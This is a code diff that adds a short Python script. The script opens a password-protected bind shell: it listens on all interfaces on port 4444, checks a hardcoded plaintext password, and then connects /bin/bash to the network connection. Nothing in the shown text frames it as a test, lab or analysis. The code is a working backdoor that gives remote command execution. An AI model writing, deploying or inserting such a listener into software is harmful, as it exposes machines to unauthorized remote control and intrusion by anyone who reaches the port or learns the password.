@@ -1,0 +1,32 @@
+import socket
+import subprocess
+
+# Configuration
+PORT = 4444
+PASSWORD = "your_secure_password"  # Change this to a strong password
+LISTEN_IP = "0.0.0.0"  # Listen on all interfaces (use 127.0.0.1 for local-only)
+
+def handle_connection(conn):
+    conn.send(b"Enter password: ")
+    password = conn.recv(1024).decode().strip()
+
+    if password == PASSWORD:
+        conn.send(b"Access granted. Spawning shell...\n")
+        subprocess.run(["/bin/bash"], stdin=conn.fileno(), stdout=conn.fileno(), stderr=conn.fileno())
+    else:
+        conn.send(b"Access denied. Closing connection.\n")
+        conn.close()
+
+def main():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((LISTEN_IP, PORT))
+        s.listen(5)
+        print(f"Listening on {LISTEN_IP}:{PORT}...")
+
+        while True:
+            conn, addr = s.accept()
+            print(f"Connection from {addr}")
+            handle_connection(conn)
+
+if __name__ == "__main__":
+    main()
